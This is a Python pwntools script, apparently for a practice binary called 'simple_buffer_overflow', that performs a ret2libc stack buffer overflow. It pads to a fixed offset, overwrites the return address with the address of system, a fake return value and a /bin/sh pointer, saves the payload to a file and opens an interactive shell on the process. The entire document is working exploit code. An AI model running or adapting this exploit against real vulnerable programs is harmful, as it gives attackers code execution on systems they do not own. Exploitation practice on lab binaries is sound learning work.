# take filename as argument
# take desired fn name as argument
# take sequence length as arg default 50
import argparse
from pwn import *

#libc=ELF("/lib32/libc.so.6")
libc=ELF("simple_buffer_overflow")
libc_system=libc.symbols["system"]
print(p32(libc_system))
print(libc_system)

parser = argparse.ArgumentParser()
parser.add_argument("exe", help="Executable name")

args = parser.parse_args()
exe = args.exe

# second round with offset from ip
smashoffset = 62#cyclic_find(user_input)
print("smashoffset: ", smashoffset)
g=cyclic_gen()

sh = process(exe)
gdb_smash = gdb.attach(
sh,
gdbscript='break main break *0x08049189', 
)

user_input_sys = input("enter address of system in hex\n")
system_address=int(user_input_sys,16)

fake_return_address=0xdeadbeef

user_input_bin = input("enter address of bin sh in hex\n")
bin_sh_address=int(user_input_bin,16)

smasher = g.get(smashoffset) + p32(libc_system) + p32(fake_return_address) + p32(bin_sh_address)
print("Trying to smash stack with: ", smasher, "length: ", smashoffset)

with open('payload.txt', 'wb') as fw:
    fw.write(smasher)

sh.sendline(smasher)
sh.interactive()
sh.close()
